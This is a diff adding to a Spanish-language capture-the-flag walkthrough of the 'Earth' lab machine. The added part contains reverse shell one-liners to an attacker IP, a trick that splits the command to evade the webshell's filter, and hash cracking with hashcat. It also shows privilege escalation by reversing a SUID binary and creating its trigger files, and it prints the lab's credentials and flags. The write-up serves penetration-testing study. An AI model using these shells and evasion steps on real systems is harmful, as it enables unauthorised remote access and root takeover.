@@ -321,7 +321,7 @@ Antes de ponernos a programar un script para hacer una prueba, podemos buscar en
 Google: XOR Encoder
 > https://www.dcode.fr/xor-cipher
 
-Introducimos el texto de prueba y la key de entrada (0 = 0x30 en ascii) y si ponemos que nos de el resultado como lista de carácteres en hexadecimal, esto es lo que obyenemos:
+Introducimos el texto de prueba y la key de entrada (0 en ascii = 48 en decimal, 0x30 en hexadecimal) y si ponemos que nos de el resultado como lista de carácteres en hexadecimal, esto es lo que obyenemos:
 
 ![xor_encode.png](xor_encode.png)
 
@@ -644,3 +644,367 @@ Vemos que en el panel podemos escribir commandos como si de una webshell se trat
 ![adminpanel_command.png](adminpanel_command.png)
 
 -------------------------------------------------------------------------------
+
+Vamos a intentar crear una reverse shell para poder operar con más facilidad:
+
+Estos podrían ser los comandos a utilizar:
+
+```bash
+> sh -i >& /dev/tcp/192.168.1.80/443 0>&1
+```
+
+```bash
+> bash -c "/bin/bash -i >& /dev/tcp/192.168.1.80/443 0>&1"
+```
+
+Al introducir cualquiera de los anteriores comandos en la webshell, vemos que nos da un mensaje de error y da la sensación que tienen cierto código de control para evitar posibles reverse shells: 
+
+Una posible idea es partir el comando en 2 partes de manera que no pueda detectar la dirección ip
+
+```bash
+> echo "sh -i >& /dev/tcp/192.168." > /tmp/rshell.txt
+> echo "1.80/443 0>&1" >> /tmp/rshell.txt
+```
+
+El fichero resultante contiene 2 lineas, separadas por un carácter newline \n, así que lo que podemos hacer es eliminar esos caracteres con el comando **tr**
+
+```bash
+> cat /tmp/rshell.txt | tr -d "\n" > /tmp/rshell.sh
+```
+
+Como podemos ver, ya se ha creado el shell script correctamente, y no tiene permisos de ejecución.
+
+```bash
+> ls -la /tmp/rshell.sh
+
+```
+Le damos los permisos:
+
+```bash
+> chmod +x /tmp/rshell.sh
+```
+y ya podemos ver que está listo para ejecutarse.
+
+```bash
+> ls -la /tmp/rshell.sh
+Command output: -rwxr-xr-x 1 apache apache 39 Jan 29 00:44 /tmp/rshell.sh
+```
+
+lo ejecutamos y ya tenemos la reverse shell establecida.
+
+-------------------------------------------------------------------------------
+
+Tras el tratamiento típico de la reverse shell para poder operar con mayor facilidad.
+
+Tras esto, intentamos averiguar donde está el código que controla esta webshell.
+
+
+```bash
+cd /var/earth_web
+bash-5.1$ > ls -la
+
+total 148
+drwxrwxrwx.  4 root root    101 Jan 28 22:02 .
+drwxr-xr-x. 22 root root   4096 Oct 12  2021 ..
+-rwxrwxrwx.  1 root root 139264 Jan 28 22:02 db.sqlite3
+drwxr-xr-x.  3 root root    108 Oct 13  2021 earth_web
+-rwxr-xr-x.  1 root root    665 Oct 11  2021 manage.py
+drwxr-xr-x.  6 root root    204 Oct 13  2021 secure_message
+-rw-r--r--.  1 root root     45 Oct 12  2021 user_flag.txt
+```
+Y en este directorio obtenemos la flag del usuario:
+
+```bash
+> cat user_flag.txt 
+[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
+```
+
+-------------------------------------------------------------------------------
+
+Como podemos ver, en este directorio podemos encotrar la base de datos utilizada para el servicio web utilizado.
+
+```bash
+bash-5.1$ > sqlite3 db.sqlite3
+
+```
+
+Miramos qué tablas contiene la base de datos:
+
+```sql
+sqlite> .tables
+
+auth_group                       django_admin_log               
+auth_group_permissions           django_content_type            
+auth_permission                  django_migrations              
+auth_user                        django_session                 
+auth_user_groups                 secure_message_encryptedmessage
+auth_user_user_permissions   
+```
+y ahora podemos ver qué usuarios hay almacenados en la tabla **auth_user**
+
+```sql
+sqlite> select * from auth_user;
+
+1|pbkdf2_sha256$260000$r1dLc8SJHJ2HpUhE8R9Vwu$ed5KqOU5NXiXYRGiK4JCBHAezQS+OWdWBpeE9z33y/4=|2023-01-28 22:02:46.603398|1|terra||terra@earth.local|1|1|2021-10-12 23:13:50.794509|
+```
+
+-------------------------------------------------------------------------------
+
+A priori ese password debería ser el mismo que hemos utilizado en el panel de login para entrar en la CLI de administración, pero podemos comprobarlo utilizando hashcat
+
+El tipo de hash **pbkdf2_sha256** es el usado por Django. El hash encontrado el la base de datos, lo guardamos en hash.txt y el password del panel de login en password.txt
+
+```bash
+> hashcat -m 10000 hash.txt password.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-4200M CPU @ 2.50GHz, 1441/2947 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: password.txt
+* Passwords.: 1
+* Bytes.....: 29
+* Keyspace..: 1
+* Runtime...: 0 secs
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.           
+
+pbkdf2_sha256$260000$r1dLc8SJHJ2HpUhE8R9Vwu$ed5KqOU5NXiXYRGiK4JCBHAezQS+OWdWBpeE9z33y/4=:earthclimatechangebad4humans
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
+Hash.Target......: pbkdf2_sha256$260000$r1dLc8SJHJ2HpUhE8R9Vwu$ed5KqOU...33y/4=
+Time.Started.....: Sun Jan 29 08:56:27 2023 (2 secs)
+Time.Estimated...: Sun Jan 29 08:56:29 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (password.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:        0 H/s (1.11ms) @ Accel:96 Loops:512 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1/1 (100.00%)
+Rejected.........: 0/1 (0.00%)
+Restore.Point....: 0/1 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259584-259999
+Candidate.Engine.: Device Generator
+Candidates.#1....: earthclimatechangebad4humans -> earthclimatechangebad4humans
+Hardware.Mon.#1..: Util: 58%
+
+Stopped: Sun Jan 29 08:56:32 2023
+```
+
+Como podemos ver por la línea ** Status...........: Cracked ** Hash y password coinciden, por lo que no hace falta esa credencial no nos aporta nada nuevo.
+
+-------------------------------------------------------------------------------
+
+Probamos a encontrar ficheros con permisos de ejecución privilegiados:
+
+```bash
+> bash-5.1$ find / -perm /4000 2>/dev/null
+```
+
+``` bash
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/reset_root
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+```
+
+-------------------------------------------------------------------------------
+
+Podemos intentar mirar qué capabilities tenemos dsponibles en el sistema:
+
+```bash
+sh-5.1$ getcap                  
+sh: getcap: command not found
+```
+Vemos que el comando getcap no está disponible, por lo que no podremos mirar las capabilities con el siguiente comando:
+
+```bash
+getcap -r / 2>/dev/null 
+```
+
+-------------------------------------------------------------------------------
+
+Si miramos el comando reset root, no encontramos información por internet. Vemos que el comando no es un script ejecutable, sino un binario.
+Al ejecutarlo obtenemos la siguiente salida:
+                                                   
+```bash
+sh-5.1$ reset_root 
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+```
+
+Podemos observar un poco su contenido utilizando el comando strings:
+
+```bash
+> strings /usr/bin/reset_root
+...
+H=@@@
+paleblueH
+]\UH
+credentiH
+als rootH
+:theEartH
+hisflat
+[]A\A]A^A_
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd
+RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+;*3$"
+GCC: (GNU) 11.1.1 20210531 (Red Hat 11.1.1-3)
+GCC: (GNU) 11.2.1 20210728 (Red Hat 11.2.1-1)
+3g979
+running gcc 11.1.1 20210531
+annobin gcc 11.1.1 20210531
+GA*GOW
+GA+stack_clash
+GA*cf_protection
+GA*FORTIFY
+GA+GLIBCXX_ASSERTIONS
+GA+omit_frame_pointer
+...
+
+```
+
+Gracias a esto podemos intuir que el comando lo que hace es cambiar el password de root si se acontecen unas determinadas condiciones.
+Aparecen como posibles credenciales/passwords las palabras: paleblue, theEarthisflat, o Earth. Esta última es la que parece que se establece cuando se cambie el password con el comando reset_root.
+
+Podemos intentar mirar qué ocurre con ltrace, pero para ello descargaremos el binario de la máquina víctima a la máquina local nuestra como atacantes.
+
+```bash
+> ltrace ./reset_root 
+puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
+)                 = 38
+access("/dev/shm/kHgTFI5G", 0)                              = -1
+access("/dev/shm/Zw7bV9U5", 0)                              = -1
+access("/tmp/kcM0Wewe", 0)                                  = -1
+puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+)                 = 44
++++ exited (status 0) +++
+```
+
+Por lo que parece, se espera tener acceso a unos ficheros específicos en /dev/shm y /tmp, así que podemos crear dichos ficheros y probar de nuevo el comando a ver qué ocurre:
+
+```bash
+sh-5.1$ touch /tmp/kcM0Wewe
+sh-5.1$ touch /dev/shm/Zw7bV9U5
+sh-5.1$ touch /dev/shm/kHgTFI5G
+sh-5.1$ reset_root 
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+```
+
+Parece que ha funcionado porque el mensaje es diferente. Probemos a entrar como el usuario root con el password proporcionado:
+
+
+```bash
+sh-5.1$ su root
+password: [Earth]
+```
+
+Parece funcionar.
+
+```bash
+[root@earth secure_message]# whoami
+root
+```
+-------------------------------------------------------------------------------
+
+Entramos en el directorio home de root:
+
+```bash
+[root@earth secure_message]# cd /root
+[root@earth ~]# ls -la
+total 36
+dr-xr-x---.  3 root root  216 Nov  1  2021 .
+dr-xr-xr-x. 17 root root  244 Nov  1  2021 ..
+-rw-------.  1 root root  663 Oct 11  2021 anaconda-ks.cfg
+lrwxrwxrwx.  1 root root    9 Oct 12  2021 .bash_history -> /dev/null
+-rw-r--r--.  1 root root   18 Jan 28  2021 .bash_logout
+-rw-r--r--.  1 root root  141 Jan 28  2021 .bash_profile
+-rw-r--r--.  1 root root  429 Jan 28  2021 .bashrc
+drwxr-xr-x.  3 root root   17 Oct 12  2021 .cache
+-rw-r--r--.  1 root root  100 Jan 28  2021 .cshrc
+-rw-------   1 root root   20 Nov  1  2021 .lesshst
+-rw-------.  1 root root 1139 Oct 12  2021 root_flag.txt
+-rw-r--r--.  1 root root  129 Jan 28  2021 .tcshrc
+-rw-------   1 root root    0 Nov  1  2021 .viminfo
+-rw-r--r--.  1 root root   60 Oct 12  2021 .vimrc
+
+```
+
+-------------------------------------------------------------------------------
+
+y finalmente mostramos la flag:
+
+```bash
+[root@earth ~]# cat root_flag.txt 
+
+              _-o#&&*''''?d:>b\_
+          _o/"`''  '',, dMF9MMMMMHo_
+       .o&#'        `"MbHMMMMMMMMMMMHo.
+     .o"" '         vodM*$&&HMMMMMMMMMM?.
+    ,'              $M&ood,~'`(&##MMMMMMH\
+   /               ,MMMMMMM#b?#bobMMMMHMMML
+  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
+ ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
+|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
+$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
+]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
+MMMMMb_                   |MMMMMMMMMMMP'     :
+HMMMMMMMHo                 `MMMMMMMMMT       .
+?MMMMMMMMP                  9MMMMMMMM}       -
+-?MMMMMMM                  |MMMMMMMMM?,d-    '
+ :|MMMMMM-                 `MMMMMMMT .M|.   :
+  .9MMM[                    &MMMMM*' `'    .
+   :9MMk                    `MMM#"        -
+     &M}                     `          .-
+      `&.                             .
+        `~,   .                     ./
+            . _                  .-
+              '`--._,dd###pp=""'
+
+Congratulations on completing Earth!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_b0da9554d29db2117b02aa8b66ec492e]
+```
